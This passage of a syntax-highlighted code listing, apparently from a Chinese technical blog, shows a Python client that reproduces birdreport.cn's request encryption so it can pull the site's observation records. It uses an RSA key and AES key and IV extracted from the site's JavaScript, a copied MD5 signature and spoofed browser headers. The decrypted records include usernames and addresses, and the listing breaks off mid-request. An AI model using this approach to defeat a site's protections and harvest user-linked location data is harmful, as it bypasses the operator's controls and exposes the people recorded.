class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5, AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BirdReportAPI</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    BirdReport API 客户端</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    提供完整的请求加密、签名生成和响应解密功能</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, debug=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        初始化 API 客户端</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            debug (bool): 是否开启调试模式，显示详细的加密解密信息</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.debug = debug</span><br><span class="line">        <span class="variable language_">self</span>.api_url = <span class="string">&quot;https://api.birdreport.cn/front/activity/search&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># RSA 公钥 (用于请求数据加密)</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># Base64 编码的公钥，1024位</span></span><br><span class="line">        <span class="comment"># 来源: JavaScript 代码中的 paramPublicKey 变量</span></span><br><span class="line">        <span class="variable language_">self</span>.public_key_base64 = <span class="string">&quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCvxXa98E1uWXnBzXkS2yHUfnBM6n3PCwLdfIox03T91joBvjtoDqiQ5x3tTOfpHs3LtiqMMEafls6b0YWtgB1dse1W5m+FpeusVkCOkQxB4SZDH6tuerIknnmB/Hsq5wgEkIvO5Pff9biig6AyoAkdWpSek/1/B7zYIepYY0lxKQIDAQAB&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># AES 密钥和 IV (用于响应数据解密)</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># 这些是经过 getMapping() 函数转换后的最终值</span></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        <span class="comment"># JavaScript 原始流程:</span></span><br><span class="line">        <span class="comment"># 1. 原始存储: key_hex = &quot;6756696653534952657053656868665752665050485566485667545454484967&quot;</span></span><br><span class="line">        <span class="comment"># 2. 解码: &quot;gVifSSIRepSehhfWRfPPHUfHVgTTTHIg&quot;</span></span><br><span class="line">        <span class="comment"># 3. getMapping 转换: &quot;C8EB5514AF5ADDB94B2207B08C66601C&quot; ← 我们直接使用这个</span></span><br><span class="line">        <span class="comment"># 4. CryptoJS.enc.Utf8.parse() 解析为 WordArray</span></span><br><span class="line">        <span class="comment"># 5. AES 解密</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Python 实现: 我们跳过步骤1-2，直接使用步骤3的结果</span></span><br><span class="line">        <span class="variable language_">self</span>.aes_key_str = <span class="string">&quot;C8EB5514AF5ADDB94B2207B08C66601C&quot;</span>  <span class="comment"># 32字符 = 32字节 (AES-256)</span></span><br><span class="line">        <span class="variable language_">self</span>.aes_iv_str = <span class="string">&quot;55DD79C6F04E1A67&quot;</span>                    <span class="comment"># 16字符 = 16字节</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 转换为字节</span></span><br><span class="line">        <span class="variable language_">self</span>.aes_key = <span class="variable language_">self</span>.aes_key_str.encode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 32字节</span></span><br><span class="line">        <span class="variable language_">self</span>.aes_iv = <span class="variable language_">self</span>.aes_iv_str.encode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="comment"># 16字节</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;BirdReportAPI 初始化&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;AES Key: <span class="subst">&#123;self.aes_key_str&#125;</span> (<span class="subst">&#123;<span class="built_in">len</span>(self.aes_key)&#125;</span> bytes)&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;AES IV:  <span class="subst">&#123;self.aes_iv_str&#125;</span> (<span class="subst">&#123;<span class="built_in">len</span>(self.aes_iv)&#125;</span> bytes)&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># HTTP 请求头</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="variable language_">self</span>.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/javascript, */*; q=0.01&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://www.birdreport.cn&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.birdreport.cn/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_uuid</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        生成 UUID v4</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        对应 JavaScript 函数: getUuid()</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        生成规则:</span></span><br><span class="line"><span class="string">        1. 生成32位随机十六进制字符</span></span><br><span class="line"><span class="string">        2. 第15位(索引14)设置为&#x27;4&#x27; (UUID版本4)</span></span><br><span class="line"><span class="string">        3. 第20位(索引19)设置为8-b之间 (变体位)</span></span><br><span class="line"><span class="string">        4. 特殊处理: s[8] = s[13] = s[18] = s[23] (原JS代码中的模式)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        返回:</span></span><br><span class="line"><span class="string">            str: 32位UUID字符串 (无连字符)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        示例:</span></span><br><span class="line"><span class="string">            &#x27;a2e45d1c3cd24e72b50524aae5d72326&#x27;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        hex_digits = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line">        s = [random.choice(hex_digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># UUID v4 标准</span></span><br><span class="line">        s[<span class="number">14</span>] = <span class="string">&quot;4&quot;</span>  <span class="comment"># 版本号</span></span><br><span class="line">        s[<span class="number">19</span>] = hex_digits[(<span class="built_in">int</span>(s[<span class="number">19</span>], <span class="number">16</span>) &amp; <span class="number">3</span>) | <span class="number">8</span>]  <span class="comment"># 变体位</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 原JS代码的特殊处理</span></span><br><span class="line">        s[<span class="number">8</span>] = s[<span class="number">13</span>] = s[<span class="number">18</span>] = s[<span class="number">23</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(s)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">self, text</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        计算 MD5 哈希</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            text (str): 要哈希的文本</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        返回:</span></span><br><span class="line"><span class="string">            str: 32位小写十六进制MD5哈希值</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        示例:</span></span><br><span class="line"><span class="string">            md5_hash(&quot;hello&quot;) → &quot;5d41402abc4b2a76b9719d911017c592&quot;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt_long</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        RSA 分段加密长文本</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        对应 JavaScript 函数: encrypt.encryptLong(data)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        技术细节:</span></span><br><span class="line"><span class="string">        1. 算法: RSA PKCS#1 v1.5</span></span><br><span class="line"><span class="string">        2. 密钥: 1024位公钥</span></span><br><span class="line"><span class="string">        3. 分块: 每块最多117字节 (1024/8 - 11 = 117)</span></span><br><span class="line"><span class="string">        4. 原因: PKCS#1 v1.5 填充需要11字节开销</span></span><br><span class="line"><span class="string">        5. 处理: 将数据分块加密，然后合并</span></span><br><span class="line"><span class="string">        6. 编码: Base64</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            data (str): 要加密的JSON字符串</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        返回:</span></span><br><span class="line"><span class="string">            str: Base64编码的加密数据，失败返回None</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        示例:</span></span><br><span class="line"><span class="string">            data = &#x27;&#123;&quot;limit&quot;:&quot;20&quot;,&quot;page&quot;:&quot;1&quot;&#125;&#x27;</span></span><br><span class="line"><span class="string">            encrypted = encrypt_long(data)</span></span><br><span class="line"><span class="string">            # → &quot;HJAQD7ZVObtbg7ATM5wsjNhaShrPKyyoqOnQq5eaj5+4...&quot;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 步骤1: 构建PEM格式的公钥</span></span><br><span class="line">            pem_key = <span class="string">f&quot;-----BEGIN PUBLIC KEY-----\n<span class="subst">&#123;self.public_key_base64&#125;</span>\n-----END PUBLIC KEY-----&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 步骤2: 导入RSA公钥</span></span><br><span class="line">            rsa_key = RSA.import_key(pem_key)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 步骤3: 创建PKCS#1 v1.5加密器</span></span><br><span class="line">            cipher = PKCS1_v1_5.new(rsa_key)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 步骤4: 计算块大小</span></span><br><span class="line">            <span class="comment"># RSA加密块大小 = (密钥位数 / 8) - 填充开销</span></span><br><span class="line">            <span class="comment"># 1024位密钥 = 128字节，PKCS#1 v1.5填充需要11字节</span></span><br><span class="line">            <span class="comment"># 因此每块最多: 128 - 11 = 117字节</span></span><br><span class="line">            block_size = <span class="number">117</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 步骤5: 将数据转为字节并分块加密</span></span><br><span class="line">            data_bytes = data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            encrypted_blocks = []</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n🔒 RSA加密:&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   原始数据长度: <span class="subst">&#123;<span class="built_in">len</span>(data_bytes)&#125;</span> 字节&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   分块大小: <span class="subst">&#123;block_size&#125;</span> 字节&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   块数: <span class="subst">&#123;(<span class="built_in">len</span>(data_bytes) + block_size - <span class="number">1</span>) // block_size&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data_bytes), block_size):</span><br><span class="line">                block = data_bytes[i:i + block_size]</span><br><span class="line">                encrypted_block = cipher.encrypt(block)</span><br><span class="line">                encrypted_blocks.append(encrypted_block)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 步骤6: 合并所有加密块</span></span><br><span class="line">            encrypted_data = <span class="string">b&#x27;&#x27;</span>.join(encrypted_blocks)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 步骤7: Base64编码</span></span><br><span class="line">            result = base64.b64encode(encrypted_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   加密后长度: <span class="subst">&#123;<span class="built_in">len</span>(encrypted_data)&#125;</span> 字节&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   Base64长度: <span class="subst">&#123;<span class="built_in">len</span>(result)&#125;</span> 字符&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;❌ RSA加密失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="keyword">import</span> traceback</span><br><span class="line">                traceback.print_exc()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt_response</span>(<span class="params">self, encrypted_text</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        AES-256-CBC 解密响应数据</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        对应 JavaScript 代码:</span></span><br><span class="line"><span class="string">        ```javascript</span></span><br><span class="line"><span class="string">        CryptoJS.AES.decrypt(encrypted, key, &#123;</span></span><br><span class="line"><span class="string">            iv: iv,</span></span><br><span class="line"><span class="string">            mode: CryptoJS.mode.CBC,</span></span><br><span class="line"><span class="string">            padding: CryptoJS.pad.Pkcs7</span></span><br><span class="line"><span class="string">        &#125;).toString(CryptoJS.enc.Utf8);</span></span><br><span class="line"><span class="string">        ```</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        技术细节:</span></span><br><span class="line"><span class="string">        1. 算法: AES-256-CBC</span></span><br><span class="line"><span class="string">        2. 密钥: 32字节 (256位)</span></span><br><span class="line"><span class="string">        3. IV: 16字节 (128位)</span></span><br><span class="line"><span class="string">        4. 模式: CBC (Cipher Block Chaining)</span></span><br><span class="line"><span class="string">        5. 填充: PKCS7</span></span><br><span class="line"><span class="string">        6. 编码: Base64 → 解密 → UTF-8</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        密钥转换过程 (JavaScript):</span></span><br><span class="line"><span class="string">        原始值 → hex解码 → getMapping转换 → UTF8解析 → WordArray</span></span><br><span class="line"><span class="string">        Python实现: 直接使用最终的UTF-8字符串</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            encrypted_text (str): Base64编码的加密数据</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        返回:</span></span><br><span class="line"><span class="string">            str: 解密后的JSON字符串，失败返回None</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        示例:</span></span><br><span class="line"><span class="string">            encrypted = &quot;/260Pg79+EXMZT3I1gCELbLBO6PMfVmN...&quot;</span></span><br><span class="line"><span class="string">            decrypted = decrypt_response(encrypted)</span></span><br><span class="line"><span class="string">            # → &#x27;[&#123;&quot;address&quot;:&quot;上海市...&quot;,&quot;username&quot;:&quot;张三&quot;,...&#125;]&#x27;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n🔓 AES解密:&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   加密数据长度: <span class="subst">&#123;<span class="built_in">len</span>(encrypted_text)&#125;</span> 字符&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 步骤1: Base64解码</span></span><br><span class="line">            encrypted_data = base64.b64decode(encrypted_text)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   Base64解码后: <span class="subst">&#123;<span class="built_in">len</span>(encrypted_data)&#125;</span> 字节&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 步骤2: 创建AES-256-CBC解密器</span></span><br><span class="line">            <span class="comment"># - 密钥: 32字节 UTF-8编码的字符串</span></span><br><span class="line">            <span class="comment"># - IV: 16字节 UTF-8编码的字符串</span></span><br><span class="line">            <span class="comment"># - 模式: CBC (需要IV)</span></span><br><span class="line">            cipher = AES.new(<span class="variable language_">self</span>.aes_key, AES.MODE_CBC, <span class="variable language_">self</span>.aes_iv)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 步骤3: 解密数据</span></span><br><span class="line">            decrypted_padded = cipher.decrypt(encrypted_data)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 步骤4: 去除PKCS7填充</span></span><br><span class="line">            <span class="comment"># PKCS7填充规则: 如果需要填充n个字节，则每个填充字节的值都是n</span></span><br><span class="line">            <span class="comment"># 例如: 需要填充5字节，则填充 0x05 0x05 0x05 0x05 0x05</span></span><br><span class="line">            decrypted = unpad(decrypted_padded, AES.block_size)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 步骤5: 转换为UTF-8字符串</span></span><br><span class="line">            result = decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   解密后长度: <span class="subst">&#123;<span class="built_in">len</span>(result)&#125;</span> 字符&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   数据预览: <span class="subst">&#123;result[:<span class="number">100</span>]&#125;</span>...&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;❌ AES解密失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="keyword">import</span> traceback</span><br><span class="line">                traceback.print_exc()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, page=<span class="number">1</span>, limit=<span class="number">20</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        搜索鸟类观察活动</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        完整流程:</span></span><br><span class="line"><span class="string">        1. 生成时间戳和UUID</span></span><br><span class="line"><span class="string">        2. 构建JSON数据</span></span><br><span class="line"><span class="string">        3. 计算MD5签名</span></span><br><span class="line"><span class="string">        4. RSA加密数据</span></span><br><span class="line"><span class="string">        5. 设置请求头(timestamp, requestId, sign)</span></span><br><span class="line"><span class="string">        6. 发送POST请求</span></span><br><span class="line"><span class="string">        7. 接收响应</span></span><br><span class="line"><span class="string">        8. 检测并解密加密字段</span></span><br><span class="line"><span class="string">        9. 返回解密后的JSON数据</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            page (int): 页码，从1开始</span></span><br><span class="line"><span class="string">            limit (int): 每页数量，建议20-50</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        返回:</span></span><br><span class="line"><span class="string">            dict: 解密后的响应数据，格式如下:</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;code&quot;: 0,              # 0表示成功</span></span><br><span class="line"><span class="string">                &quot;count&quot;: 1060129,       # 总数据量</span></span><br><span class="line"><span class="string">                &quot;data&quot;: [               # 活动列表</span></span><br><span class="line"><span class="string">                    &#123;</span></span><br><span class="line"><span class="string">                        &quot;serialId&quot;: &quot;2025102602261&quot;,</span></span><br><span class="line"><span class="string">                        &quot;username&quot;: &quot;kingwood&quot;,</span></span><br><span class="line"><span class="string">                        &quot;pointName&quot;: &quot;广州市白云区龙虎岗&quot;,</span></span><br><span class="line"><span class="string">                        &quot;address&quot;: &quot;广东省广州市白云区...&quot;,</span></span><br><span class="line"><span class="string">                        &quot;startTime&quot;: &quot;2025-10-26 09:00&quot;,</span></span><br><span class="line"><span class="string">                        &quot;endTime&quot;: &quot;2025-10-26 15:12&quot;,</span></span><br><span class="line"><span class="string">                        &quot;taxonCount&quot;: 15,</span></span><br><span class="line"><span class="string">                        ...</span></span><br><span class="line"><span class="string">                    &#125;,</span></span><br><span class="line"><span class="string">                    ...</span></span><br><span class="line"><span class="string">                ],</span></span><br><span class="line"><span class="string">                &quot;timestamp&quot;: 1761489027,</span></span><br><span class="line"><span class="string">                &quot;sign&quot;: &quot;...&quot;,</span></span><br><span class="line"><span class="string">                &quot;requestId&quot;: &quot;...&quot;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            失败返回None</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        示例:</span></span><br><span class="line"><span class="string">            api = BirdReportAPI()</span></span><br><span class="line"><span class="string">            result = api.search(page=1, limit=20)</span></span><br><span class="line"><span class="string">            if result and result.get(&#x27;code&#x27;) == 0:</span></span><br><span class="line"><span class="string">                for activity in result[&#x27;data&#x27;]:</span></span><br><span class="line"><span class="string">                    print(activity[&#x27;username&#x27;], activity[&#x27;pointName&#x27;])</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;搜索活动 (page=<span class="subst">&#123;page&#125;</span>, limit=<span class="subst">&#123;limit&#125;</span>)&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># 步骤1: 生成时间戳（毫秒）</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        timestamp = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># 步骤2: 生成requestId (UUID v4)</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        request_id = <span class="variable language_">self</span>.get_uuid()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># 步骤3: 构建请求数据 (JSON)</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># 注意: limit和page必须是字符串类型</span></span><br><span class="line">        data = json.dumps(&#123;</span><br><span class="line">            <span class="string">&quot;limit&quot;</span>: <span class="built_in">str</span>(limit),</span><br><span class="line">            <span class="string">&quot;page&quot;</span>: <span class="built_in">str</span>(page)</span><br><span class="line">        &#125;, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))  <span class="comment"># 无空格的紧凑格式</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n📦 请求数据:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   timestamp: <span class="subst">&#123;timestamp&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   requestId: <span class="subst">&#123;request_id&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   data: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># 步骤4: 生成签名</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># 签名算法: MD5(data + requestId + timestamp)</span></span><br><span class="line">        <span class="comment"># 注意: 必须在加密前计算签名！</span></span><br><span class="line">        sign_string = data + request_id + <span class="built_in">str</span>(timestamp)</span><br><span class="line">        sign = <span class="variable language_">self</span>.md5_hash(sign_string)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n🔏 签名:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   签名字符串: <span class="subst">&#123;sign_string&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   MD5: <span class="subst">&#123;sign&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># 步骤5: RSA加密数据</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        encrypted_data = <span class="variable language_">self</span>.encrypt_long(data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> encrypted_data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;❌ 数据加密失败&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># 步骤6: 设置请求头</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># 关键请求头:</span></span><br><span class="line">        <span class="comment"># - timestamp: 时间戳（毫秒）</span></span><br><span class="line">        <span class="comment"># - requestId: UUID</span></span><br><span class="line">        <span class="comment"># - sign: MD5签名</span></span><br><span class="line">        headers = <span class="variable language_">self</span>.headers.copy()</span><br><span class="line">        headers[<span class="string">&#x27;timestamp&#x27;</span>] = <span class="built_in">str</span>(timestamp)</span><br><span class="line">        headers[<span class="string">&#x27;requestId&#x27;</span>] = request_id</span><br><span class="line">        headers[<span class="string">&#x27;sign&#x27;</span>] = sign</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># 步骤7: 发送POST请求</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n📤 发送请求:&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   URL: <span class="subst">&#123;self.api_url&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   加密数据长度: <span class="subst">&#123;<span class="built_in">len</span>(encrypted_data)&#125;</span> 字符&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            response = requests.post(</span><br><span 